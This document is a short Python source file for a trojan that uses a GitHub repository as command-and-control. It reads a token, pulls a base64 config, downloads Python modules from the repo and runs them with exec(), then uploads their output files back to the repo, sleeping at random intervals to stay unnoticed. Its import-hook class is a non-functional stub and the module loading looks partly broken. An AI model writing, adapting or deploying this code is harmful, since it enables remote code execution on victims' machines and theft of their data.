import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime
import os

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, filename, repo):
    return repo.file_contents(f'{dirname}/{filename}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        return config

    def fetch_module(self, module_name):
        module_code = get_file_contents('modules', f'{module_name}.py', self.repo)
        if module_code:
            exec(base64.b64decode(module_code), globals())
            return sys.modules[module_name]

    def module_runner(self, module_name):
        module = self.fetch_module(module_name)
        if module:
            result_file = module.run()
            self.store_file(result_file)
        else:
            print(f"Module {module_name} could not be loaded.")

    def store_file(self, file_path):
        with open(file_path, 'rb') as file:
            file_data = file.read()

        bindata = base64.b64encode(file_data)
        message = f"Module output from {datetime.now().isoformat()}"
        remote_path = f'data/{self.id}/{os.path.basename(file_path)}'
        
        # Upload the file to the GitHub repository
        self.repo.create_file(remote_path, message, bindata)

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()

